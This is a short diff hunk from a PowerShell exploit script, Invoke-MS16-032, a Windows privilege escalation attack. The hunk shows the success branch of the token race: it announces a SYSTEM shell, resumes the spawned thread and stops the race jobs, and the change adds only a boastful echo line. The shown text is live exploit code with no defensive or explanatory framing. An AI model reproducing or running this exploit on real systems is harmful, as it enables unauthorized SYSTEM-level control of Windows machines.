@@ -322,6 +322,7 @@ function Invoke-MS16-032 {
 		# If we can't open the process token it's a SYSTEM shell!
 		if (!$CallResult) {
 			echo "[!] Holy Handle Leak Potato, we have a SYSTEM shell !!!!!!`n"
+			echo "[!] 637 fuck3d w1nd0w5 `n"
 			$CallResult = [Kernel32]::ResumeThread($ProcessInfo.hThread)
 			$StartTokenRace.Stop()
 			$SafeGuard.Stop()
